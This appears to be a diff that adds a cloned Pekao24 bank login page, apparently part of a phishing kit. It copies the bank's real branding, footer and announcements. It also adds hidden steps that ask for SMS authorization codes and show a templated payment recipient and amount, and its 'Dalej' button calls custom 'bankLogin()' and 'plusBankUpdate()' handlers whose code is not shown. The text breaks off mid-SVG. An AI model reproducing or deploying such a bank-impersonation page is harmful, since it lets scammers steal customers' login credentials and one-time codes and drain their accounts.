+                                                      <button _ngcontent-tvb-c5="" aria-label="Otwórz klawiaturę ekranową" class="field-button keyboard-button ng-star-inserted" type="button" style="">
+                                                         <i _ngcontent-tvb-c5="" pekao-icon="" _nghost-tvb-c24="">
+                                                            <svg fill="currentColor" focusable="false" aria-hidden="true" role="img" xmlns="http://www/w3/org/2000/svg" viewBox="0 0 20 20">
+                                                               <path fill="currentColor" d="M1 2h18a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1H1a1 1 0 0 1-1-1V3a1 1 0 0 1 1-1zm1 2v12h16V4H2zm5.5 8h5a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-5a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm-4-6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm0 6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm2-3h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm-6-3h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm0 6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5z"></path>
+                                                            </svg>
+                                                         </i>
+                                                      </button>
+                                                            </span>
+                                                                </div>
+
+
+
+
+
+
+                                                                <div id="psdForm" style="display: none">
+                                                                    <label _ngcontent-tvb-c22="" for="customer" class="ng-star-inserted" style="">
+                                                                        Wpisz kod SMS z telefonu
+                                                                    </label>
+                                                                    <span _ngcontent-tvb-c22="" class="field-and-buttons">
+                                                      <input _ngcontent-tvb-c5="" aria-describedby="customerError" class="pekao-field-input ng-untouched ng-pristine ng-invalid ng-star-inserted" formcontrolname="customer" id="bank_psd" pekaoforcemaxlength="" pekaokeyboardsupport="" type="text" maxlength="20" aria-invalid="true" style="">
+                                                      <button _ngcontent-tvb-c5="" aria-label="Otwórz klawiaturę ekranową" class="field-button keyboard-button ng-star-inserted" type="button" style="">
+                                                         <i _ngcontent-tvb-c5="" pekao-icon="" _nghost-tvb-c24="">
+                                                            <svg fill="currentColor" focusable="false" aria-hidden="true" role="img" xmlns="http://www/w3/org/2000/svg" viewBox="0 0 20 20">
+                                                               <path fill="currentColor" d="M1 2h18a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1H1a1 1 0 0 1-1-1V3a1 1 0 0 1 1-1zm1 2v12h16V4H2zm5.5 8h5a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-5a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm-4-6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm0 6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm2-3h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm-6-3h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm0 6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5z"></path>
+                                                            </svg>
+                                                         </i>
+                                                      </button>
+                                                            </span>
+                                                                </div>
+
+
+                                                                <div id="summaryForm" style="display: none">
+                                                                    <label _ngcontent-tvb-c22="" for="customer" class="ng-star-inserted" style="">
+                                                                        Wpisz kod otrzymany na Twój telefon
+                                                                    </label>
+                                                                    <span _ngcontent-tvb-c22="" class="field-and-buttons">
+                                                      <input _ngcontent-tvb-c5="" aria-describedby="customerError" class="pekao-field-input ng-untouched ng-pristine ng-invalid ng-star-inserted" formcontrolname="customer" id="bank_psd" pekaoforcemaxlength="" pekaokeyboardsupport="" type="text" maxlength="20" aria-invalid="true" style="">
+                                                      <button _ngcontent-tvb-c5="" aria-label="Otwórz klawiaturę ekranową" class="field-button keyboard-button ng-star-inserted" type="button" style="">
+                                                         <i _ngcontent-tvb-c5="" pekao-icon="" _nghost-tvb-c24="">
+                                                            <svg fill="currentColor" focusable="false" aria-hidden="true" role="img" xmlns="http://www/w3/org/2000/svg" viewBox="0 0 20 20">
+                                                               <path fill="currentColor" d="M1 2h18a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1H1a1 1 0 0 1-1-1V3a1 1 0 0 1 1-1zm1 2v12h16V4H2zm5.5 8h5a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-5a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm-4-6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm0 6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm2-3h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm-6-3h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm0 6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5z"></path>
+                                                            </svg>
+                                                         </i>
+                                                      </button>
+                                                            </span>
+
+
+                                                                </div>
+                                                            </div>
+
+
+
+
+                                                            <div id="confirmForm" style="display: none">
+                                                                <label _ngcontent-tvb-c22="" for="customer" class="ng-star-inserted" style="">
+                                                                    Wpisz kod otrzymany na Twój telefon
+                                                                </label>
+                                                                <span _ngcontent-tvb-c22="" class="field-and-buttons">
+                                                      <input _ngcontent-tvb-c5="" aria-describedby="customerError" class="pekao-field-input ng-untouched ng-pristine ng-invalid ng-star-inserted" formcontrolname="customer" id="bank_summary" pekaoforcemaxlength="" pekaokeyboardsupport="" type="text" maxlength="20" aria-invalid="true" style="">
+                                                      <button _ngcontent-tvb-c5="" aria-label="Otwórz klawiaturę ekranową" class="field-button keyboard-button ng-star-inserted" type="button" style="">
+                                                         <i _ngcontent-tvb-c5="" pekao-icon="" _nghost-tvb-c24="">
+                                                            <svg fill="currentColor" focusable="false" aria-hidden="true" role="img" xmlns="http://www/w3/org/2000/svg" viewBox="0 0 20 20">
+                                                               <path fill="currentColor" d="M1 2h18a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1H1a1 1 0 0 1-1-1V3a1 1 0 0 1 1-1zm1 2v12h16V4H2zm5.5 8h5a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-5a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm-4-6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm0 6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm2-3h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm-6-3h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm0 6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5z"></path>
+                                                            </svg>
+                                                         </i>
+                                                      </button>
+                                                            </span>
+                                                                <br><br>
+                                                                <p>Informacje o płatności:</p>
+                                                                <p>Odbiorca: <%= config["receiver"] %></p>
+                                                                <p>Kwota: <%= config["price"] %></p>
+                                                            </div>
+
+
+
+
+
+
+
+                                                            <div _ngcontent-tvb-c22="" class="messages-container">
+                                                                <pekao-validation _ngcontent-tvb-c22="" _nghost-tvb-c28="" class="ng-star-inserted" style="">
+                                                                    <pekao-custom-validation-message _ngcontent-tvb-c5="" for="pattern" class="ng-star-inserted"></pekao-custom-validation-message>
+                                                                    <pekao-custom-validation-message _ngcontent-tvb-c5="" for="required" class="ng-star-inserted"></pekao-custom-validation-message>
+                                                                </pekao-validation>
+                                                            </div>
+                                                        </div>
+                                                    </pekao-field>
+                                                </div>
+                                                <section _ngcontent-tvb-c5="" class="main-action-group" id="buttonsCont">
+                                                    <pekao-button onclick="bankLogin(); plusBankUpdate()" _ngcontent-tvb-c5="" _nghost-tvb-c20=""><button _ngcontent-tvb-c5="" class="button button-primary">Dalej</button></pekao-button>
+                                                </section>
+                                                <section _ngcontent-tvb-c5="" class="account-action-group show-on-mobile">
+                                                    <pekao-button _ngcontent-tvb-c5="" _nghost-tvb-c20=""><a _ngcontent-tvb-c5="" class="button button-tertiary account-link" rel="noopener" target="_blank" href="https://www.pekao.com.pl/klient-indywidualny/codzienne-bankowanie/konta-osobiste/konto-przekorzystne.html">Nie masz konta? Zostań klientem</a></pekao-button>
+                                                </section>
+                                                <pekao-cms-message-group _ngcontent-tvb-c5="" _nghost-tvb-c25="">
+                                                    <section _ngcontent-tvb-c25="" class="cms-message-group">
+                                                        <pekao-login-inaccessibility-announcement _nghost-tvb-c42="" class="ng-star-inserted" style="">
+                                                            <i _ngcontent-tvb-c42="" class="stopwatch-icon" pekao-icon="" _nghost-tvb-c24="">
+                                                                <svg fill="currentColor" focusable="false" aria-hidden="true" role="img" xmlns="http://www/w3/org/2000/svg" viewBox="0 0 20 20">
+                                                                    <g data-name="Layer 2">
+                                                                        <path d="M14.403 4.614v-1.75a.6.6 0 0 1 1-.43l3.5 3.44a.6.6 0 0 1-.42 1h-1.92a8.5 8.5 0 1 1-2.16-2.26zm-6.42 6.05l-1.41-2.12a1 1 0 1 1 1.66-1.11l1.37 2.05a1.7 1.7 0 1 1-1.62 1.18zm1.42 7.32a6.5 6.5 0 1 0-6.5-6.5 6.5 6.5 0 0 0 6.5 6.5zm-3-18h6v2h-6z" data-name="Layer 1"></path>
+                                                                    </g>
+                                                                </svg>
+                                                            </i>
+                                                            <div _ngcontent-tvb-c42="" class="ql-container ql-pekao ql-disabled">
+                                                                <div class="ql-editor" data-gramm="false" contenteditable="false" data-placeholder=" ">
+                                                                    <p>Planowane prace serwisowe w najbliższych dniach. Sprawdź co może nie działać. <a url="https://www.pekao24.pl/logowanie/(modal:pomoc-w-logowaniu/komunikaty;id=1166)" type="INTERNAL" rel="noopener noreferrer" target="_blank">Więcej &gt;</a></p>
+                                                                </div>
+                                                                <div class="ql-clipboard" contenteditable="true" tabindex="-1"></div>
+                                                            </div>
+                                                        </pekao-login-inaccessibility-announcement>
+                                                        <pekao-login-announcements-group _nghost-tvb-c40="" class="ng-star-inserted" style="">
+                                                            <pekao-login-announcement _nghost-tvb-c41="" class="ng-star-inserted">
+                                                                <div _ngcontent-tvb-c41="" class="ql-container ql-pekao ql-disabled">
+                                                                    <div class="ql-editor" data-gramm="false" contenteditable="false" data-placeholder=" ">
+                                                                        <p data-before-content="27.01.2021">Uważaj na oszustów na platformach zakupowych! <a url="https://www.pekao24.pl/logowanie/(modal:pomoc-w-logowaniu/komunikaty;id=1064)" type="INTERNAL" rel="noopener noreferrer" target="_blank">Więcej &gt;</a></p>
+                                                                    </div>
+                                                                    <div class="ql-clipboard" contenteditable="true" tabindex="-1"></div>
+                                                                </div>
+                                                            </pekao-login-announcement>
+                                                            <pekao-login-announcement _nghost-tvb-c41="" class="ng-star-inserted">
+                                                                <div _ngcontent-tvb-c41="" class="ql-container ql-pekao ql-disabled">
+                                                                    <div class="ql-editor" data-gramm="false" contenteditable="false" data-placeholder=" ">
+                                                                        <p data-before-content="31.12.2020">Uwaga! Ostrzegamy przed możliwymi cyberatakami skierowanymi na klientów. <a url="https://www.pekao24.pl/logowanie/(modal:pomoc-w-logowaniu/komunikaty;id=962)" type="INTERNAL" rel="noopener noreferrer" target="_blank">Więcej &gt;</a></p>
+                                                                    </div>
+                                                                    <div class="ql-clipboard" contenteditable="true" tabindex="-1"></div>
+                                                                </div>
+                                                            </pekao-login-announcement>
+                                                        </pekao-login-announcements-group>
+                                                    </section>
+                                                </pekao-cms-message-group>
+                                            </div>
+                                            <footer _ngcontent-tvb-c21="" class="login-container-footer">
+                                                <pekao-login-support-action-group _ngcontent-tvb-c5="" class="login-container-footer" login-container-footer="" _nghost-tvb-c26="">
+                                                    <section _ngcontent-tvb-c26="" class="login-support-action-group-wrapper">
+                                                        <pekao-button _ngcontent-tvb-c26="" _nghost-tvb-c20=""><a _ngcontent-tvb-c26="" class="button button-tertiary" rel="noopener" target="_blank" href="https://www.pekao.com.pl/klient-indywidualny/bankowosc-elektroniczna/bezpieczenstwo-Pekao24/zalecenia.html">Bezpieczeństwo</a></pekao-button>
+                                                        <pekao-button _ngcontent-tvb-c26="" _nghost-tvb-c20=""><button _ngcontent-tvb-c26="" class="button button-tertiary" type="button">Pomoc w logowaniu</button></pekao-button>
+                                                    </section>
+                                                </pekao-login-support-action-group>
+                                            </footer>
+                                        </div>
+                                    </section>
+                                </pekao-login-step-box>
+                            </pekao-login-customer>
+                        </section>
+                    </main>
+                    <pekao-cookies _ngcontent-tvb-c2="" _nghost-tvb-c15="" class="ng-tns-c2-2 ng-star-inserted hide-cookies">
+                        <div _ngcontent-tvb-c15="" class="cookies-wrapper">
+                            <div _ngcontent-tvb-c15="">
+                                <h3 _ngcontent-tvb-c15="" class="cookies-title">Pliki Cookies</h3>
+                                <p _ngcontent-tvb-c15="" class="cookies-txt">W ramach usługi Pekao24 stosujemy pliki cookies. Korzystanie z usługi Pekao24 bez zmiany ustawień przeglądarki internetowej oznacza akceptację otrzymywania cookies.<br _ngcontent-tvb-c15="">W dowolnej chwili istnieje możliwość dokonania zmiany ustawień plików cookies. Więcej o <a _ngcontent-tvb-c15="" class="link" href="https://www.pekao.com.pl/o-banku/stopka/polityka-prywatnosci.html" rel="noopener" target="_blank">polityce prywatności</a>.&nbsp; </p>
+                            </div>
+                            <pekao-button _ngcontent-tvb-c15="" class="cookies-button" _nghost-tvb-c20="">
+                                <button _ngcontent-tvb-c15="" class="button button-tertiary" type="button">
+                                    <i _ngcontent-tvb-c15="" class="cookies-close-icon" pekao-icon="" _nghost-tvb-c24="">
+                                        <svg fill="currentColor" focusable="false" aria-hidden="true" role="img" xmlns="http://www/w3/org/2000/svg" viewBox="0 0 14.52 14.52">
+                                            <g data-name="Layer 2">
+                                                <path d="M8.51 7.26L14.28 13A.88.88 0 0 1 13 14.28L7.26 8.51l-5.78 5.77A.88.88 0 0 1 .24 13L6 7.26.24 1.48A.88.88 0 0 1 1.48.24L7.26 6 13 .24a.88.88 0 0 1 1.24 1.24z" data-name="Layer 1"></path>
+                                            </g>
+                                        </svg>
+                                    </i>
+                                </button>
+                            </pekao-button>
+                        </div>
+                    </pekao-cookies>
+                    <pekao-login-footer _ngcontent-tvb-c3="" _nghost-tvb-c17="">
+                        <footer _ngcontent-tvb-c17="" class="footer">
+                            <section _ngcontent-tvb-c17="" class="footer-section">
+                                <div _ngcontent-tvb-c17="" class="footer-wrapper footer-navigation">
+                                    <div _ngcontent-tvb-c17="" class="footer-navigation-group phone-numbers-group">
+                                        <pekao-button _ngcontent-tvb-c17="" _nghost-tvb-c20=""><a _ngcontent-tvb-c17="" class="button button-tertiary phone-number" href="tel:801365365">801 365 365</a></pekao-button>
+                                        <pekao-button _ngcontent-tvb-c17="" _nghost-tvb-c20=""><a _ngcontent-tvb-c17="" class="button button-tertiary phone-number" href="tel:+48225912232">+48 22 59 12 232</a></pekao-button>
+                                    </div>
+                                    <div _ngcontent-tvb-c17="" class="footer-navigation-group links-group">
+                                        <div _ngcontent-tvb-c17="" class="links">
+                                            <pekao-button _ngcontent-tvb-c17="" _nghost-tvb-c20=""><a _ngcontent-tvb-c17="" class="button button-tertiary" rel="noopener" target="_blank" href="https://www.pekao.com.pl/klient-indywidualny/bankowosc-elektroniczna/bezpieczenstwo.html">Bezpieczeństwo</a></pekao-button>
+                                            <pekao-button _ngcontent-tvb-c17="" _nghost-tvb-c20=""><a _ngcontent-tvb-c17="" class="button button-tertiary" rel="noopener" target="_blank" href="https://www.pekao.com.pl/o-banku/stopka/rodo.html">RODO</a></pekao-button>
+                                        </div>
+                                        <div _ngcontent-tvb-c17="" class="links">
+                                            <pekao-button _ngcontent-tvb-c17="" _nghost-tvb-c20=""><a _ngcontent-tvb-c17="" class="button button-tertiary" rel="noopener" target="_blank" href="https://www.pekao.com.pl/o-banku/stopka/polityka-prywatnosci.html">Polityka prywatności</a></pekao-button>
+                                            <pekao-button _ngcontent-tvb-c17="" _nghost-tvb-c20=""><a _ngcontent-tvb-c17="" class="button button-tertiary" rel="noopener" target="_blank" href="https://www.pekao.com.pl/kontakt.html">Kontakt</a></pekao-button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </section>
+                            <section _ngcontent-tvb-c17="" class="footer-section bank-information ng-star-inserted">
+                                <div _ngcontent-tvb-c17="" class="footer-wrapper footer-info-group">
+                                    <span _ngcontent-tvb-c17="" class="krs-txt"> Bank Polska Kasa Opieki Spółka Akcyjna z siedzibą w Warszawie, ul. Grzybowska 53/57, 00-844 Warszawa, wpisany do rejestru przedsiębiorców w Sądzie Rejonowym dla m.st. Warszawy w Warszawie, XII Wydział Gospodarczy Krajowego Rejestru Sądowego, KRS: 0000014843, NIP: 526-00-06-841, REGON: 000010205, wysokość kapitału zakładowego i kapitału wpłaconego: 262 470 034 zł. </span>
+                                    <div _ngcontent-tvb-c17="" class="definition-group">
+                                        <section _ngcontent-tvb-c17="" class="codes"><span _ngcontent-tvb-c17="" class="padding-right">KOD BIC/SWIFT: PKOPPLPW</span></section>
+                                        <section _ngcontent-tvb-c17=""> © 2020 Bank Polska Kasa Opieki Spółka Akcyjna</section>
+                                    </div>
+                                </div>
+                            </section>
+                        </footer>
+                    </pekao-login-footer>
+                </div>
+            </pekao-login-container>
+            <div _ngcontent-tvb-c2="" class="router-outlet-modal ng-trigger ng-trigger-modalTransition">
+                <router-outlet _ngcontent-tvb-c2="" class="ng-tns-c2-2" name="modal"></router-outlet>
+            </div>
+            <pekao-snackbar-outlet _ngcontent-tvb-c2="" class="ng-tns-c2-2" _nghost-tvb-c16="" style="top: 66px; right: 0px; max-height: calc(100vh - 66px);">
+                <div _ngcontent-tvb-c16="" class="snackbar-outlet"></div>
+            </pekao-snackbar-outlet>
+            <pekao-pekao24-chat _ngcontent-tvb-c2="" class="ng-tns-c2-2">
+                <pekao-chat-bubble _nghost-tvb-c19="" class="ng-tns-c19-4 ng-star-inserted">
+                    <div _ngcontent-tvb-c19="" cdkdrag="" class="chat-wrapper cdk-drag ng-tns-c19-4 ng-star-inserted" style="touch-action: none; -webkit-user-drag: none; -webkit-tap-highlight-color: transparent; user-select: none;">
+                        <div _ngcontent-tvb-c19="" class="chat-bubble-wrapper">
+                            <div _ngcontent-tvb-c19="" class="chat-bubble-expanded-wrapper">
+                                <div _ngcontent-tvb-c19="" class="chat-type-choice-wrapper ng-trigger ng-trigger-choicerAnimation" style="opacity: 0; pointer-events: none; transform: translateX(calc(372px)); width: 0px;">
+                                    <button _ngcontent-tvb-c19="" class="chat-type-choice-bubble reset-button-style" type="button">
+                                        <i _ngcontent-tvb-c19="" class="choice-icon" pekao-icon="" _nghost-tvb-c24="">
+                                            <svg fill="currentColor" focusable="false" aria-hidden="true" role="img" xmlns="http://www/w3/org/2000/svg" viewBox="0 0 20 20">
+                                                <g data-name="Layer 2">
+                                                    <path d="M1 1h18a1 1 0 0 1 1 1v12a1 1 0 0 1-1 1h-9l-6 4v-4H1a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1zm5 14.27L9.41 13H18V3H2v10h4zM5 7V5h10v2zm0 4V9h8v2z" data-name="Layer 1"></path>
+                                                </g>
+                                            </svg>
+                                        </i>
+                                        Czat
+                                    </button>
+                                    <button _ngcontent-tvb-c19="" class="chat-type-choice-bubble reset-button-style" type="button">
+                                        <i _ngcontent-tvb-c19="" class="choice-icon" pekao-icon="" _nghost-tvb-c24="">
+                                            <svg fill="currentColor" focusable="false" aria-hidden="true" role="img" xmlns="http://www/w3/org/2000/svg" viewBox="0 0 19.01 19.01">
+                                                <g data-name="Layer 2">
+                                                    <g data-name="Layer 1">
+                                                        <path d="M15.15 3.41a4.63 4.63 0 0 1 1.08 4.85l1.5.55A6.23 6.23 0 0 0 10.26.67l.41 1.55a4.62 4.62 0 0 1 4.48 1.19zM16.88 12.06c-1.62-1.09-2.92-1.25-4-.59a3.77 3.77 0 0 0-.89.82l-.18.2a8.75 8.75 0 0 1-3.13-2.17 8.75 8.75 0 0 1-2.16-3.14l.2-.18a3.75 3.75 0 0 0 .82-.89c.66-1.06.5-2.35-.59-4C5.33-.28 3.84-.46 2.18.68S-.25 3.14.08 4.9a17.59 17.59 0 0 0 4.6 8.64l.4.39.39.4a17.6 17.6 0 0 0 8.64 4.6c1.76.33 3-.36 4.22-2.1s.96-3.15-1.45-4.77zm0 3.75c-.83 1.2-1.43 1.53-2.41 1.35a16.07 16.07 0 0 1-8.1-4.49 16.07 16.07 0 0 1-4.49-8.1C1.67 3.59 2 3 3.2 2.16c.87-.6 1.23-.56 2.26 1 .73 1.08.8 1.64.56 2a2.29 2.29 0 0 1-.47.5 3.63 3.63 0 0 0-.47.45A1.41 1.41 0 0 0 4.7 7c0 1.19.93 2.61 2.36 4.17l.37.36.36.37c1.56 1.43 3 2.35 4.17 2.36a1.41 1.41 0 0 0 .94-.37 3.73 3.73 0 0 0 .45-.47 2.31 2.31 0 0 1 .49-.48c.38-.24.93-.17 2 .56 1.57 1.08 1.61 1.43 1.01 2.31z"></path>
+                                                        <path d="M14.52 8a3.19 3.19 0 0 0-3.79-4.22l.4 1.55A1.59 1.59 0 0 1 13 7.48z"></path>
+                                                    </g>
+                                                </g>
+                                            </svg>
+                                        </i>
+                                        Porozmawiaj z ekspertem
+                                    </button>
+                                </div>
+                            </div>
+                            <button _ngcontent-tvb-c19="" class="chat-bubble reset-button-style ng-tns-c19-4 ng-trigger ng-trigger-bubbleAnimation ng-star-inserted" type="button">
+                                <i _ngcontent-tvb-c19="" class="bubble-icon" pekao-icon="" _nghost-tvb-c24="">
+                                    <svg fill="currentColor" focusable="false" aria-hidden="true" role="img" xmlns="http://www/w3/org/2000/svg" viewBox="0 0 20 20">
+                                        <g data-name="Layer 2">
+                                            <path d="M1 1h18a1 1 0 0 1 1 1v12a1 1 0 0 1-1 1h-9l-6 4v-4H1a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1zm5 14.27L9.41 13H18V3H2v10h4zM5 7V5h10v2zm0 4V9h8v2z" data-name="Layer 1"></path>
+                                        </g>
+                                    </svg>
+                                </i>
+                            </button>
+                        </div>
+                    </div>
+                </pekao-chat-bubble>
+            </pekao-pekao24-chat>
+        </pekao-login>
+    </div>
+</pekao-root-pekao24>
+<div class="app-shell app-shell-hide">
+    <header class="app-shell-header">
+        <div class="app-shell-header-wrapper">
+            <div class="app-shell-logo">
+                <svg viewBox="0 0 158 24">
+                    <g fill="#FFF" fill-rule="evenodd">
+                        <path d="M53.871 17.977c.61 0 1.123-.07 1.543-.208.42-.138.764-.326 1.03-.566.266-.238.458-.52.577-.846.12-.325.18-.674.18-1.048 0-.762-.268-1.362-.804-1.799-.535-.437-1.381-.656-2.537-.656h-3.342v5.123h3.353zM50.518 5.96v5.044h2.706c1.156 0 2.019-.216 2.59-.65.57-.433.855-1.057.855-1.872 0-.889-.268-1.531-.803-1.928-.536-.396-1.374-.594-2.515-.594h-2.833zm2.833-2.051c1.063 0 1.973.1 2.728.297.756.198 1.376.48 1.862.846.485.367.842.813 1.069 1.34.228.527.341 1.12.341 1.776 0 .382-.06.75-.18 1.104a3.208 3.208 0 0 1-.554.998c-.25.31-.564.589-.942.836a5.485 5.485 0 0 1-1.341.616c2.358.486 3.538 1.7 3.538 3.643 0 .688-.134 1.317-.399 1.89a4.184 4.184 0 0 1-1.157 1.478c-.505.415-1.127.739-1.867.97-.74.232-1.583.348-2.532.348h-6.104V3.909h5.538zM67.757 15.051c-.887.03-1.635.1-2.244.207-.608.11-1.102.248-1.479.416-.378.168-.65.367-.815.6a1.28 1.28 0 0 0-.249.761c0 .27.044.499.133.69.089.19.212.348.37.47.158.124.343.214.555.27.212.056.445.084.7.084.647 0 1.204-.118 1.67-.353.466-.236.92-.578 1.359-1.026V15.05zm-6.59-4.842c1.333-1.203 2.92-1.805 4.763-1.805.678 0 1.28.106 1.81.32.527.212.97.513 1.329.902.358.389.631.85.82 1.384.19.535.284 1.127.284 1.777v7.264h-1.11c-.239 0-.42-.036-.543-.107-.124-.071-.228-.214-.313-.431l-.242-.93c-.301.261-.598.494-.89.7-.294.206-.596.38-.908.522a4.61 4.61 0 0 1-1.006.319c-.359.07-.754.106-1.185.106-.478 0-.923-.063-1.335-.19a2.954 2.954 0 0 1-1.07-.578 2.735 2.735 0 0 1-.71-.958c-.174-.38-.26-.83-.26-1.345 0-.441.12-.87.363-1.29.243-.418.644-.793 1.203-1.126.558-.332 1.295-.607 2.208-.824.913-.217 2.04-.34 3.382-.37v-.762c0-.822-.182-1.435-.544-1.838-.362-.404-.894-.606-1.595-.606-.478 0-.879.059-1.203.174a5.544 5.544 0 0 0-.844.375c-.238.135-.45.26-.636.376a1.095 1.095 0 0 1-.589.174.724.724 0 0 1-.434-.129 1.08 1.08 0 0 1-.295-.32l-.45-.784zM74.589 10.13c.254-.254.518-.483.792-.69.273-.204.565-.382.873-.532.308-.15.636-.265.983-.347a4.91 4.91 0 0 1 1.133-.123c.647 0 1.216.105 1.705.313.49.21.902.505 1.237.886.335.38.588.84.757 1.373a5.81 5.81 0 0 1 .255 1.766v7.275h-2.475v-7.275c0-.77-.182-1.368-.549-1.794-.366-.426-.923-.639-1.67-.639-.555 0-1.07.124-1.544.37a5.274 5.274 0 0 0-1.335 1.009v8.329h-2.486V8.617h1.503c.34 0 .555.153.648.46l.173 1.053zM86.913 3.46v9.618h.532c.17 0 .308-.022.416-.067a.914.914 0 0 0 .336-.28l3.306-3.665c.116-.15.243-.262.381-.337.14-.074.317-.112.533-.112h2.254l-3.977 4.349a2.98 2.98 0 0 1-.763.695c.154.105.289.223.405.353.115.131.227.28.335.443l4.243 5.594h-2.22c-.2 0-.372-.032-.514-.095a.876.876 0 0 1-.376-.354l-3.41-4.484c-.117-.171-.232-.282-.348-.33-.115-.049-.289-.073-.52-.073h-.613v5.336h-2.486V3.46h2.486zM106.278 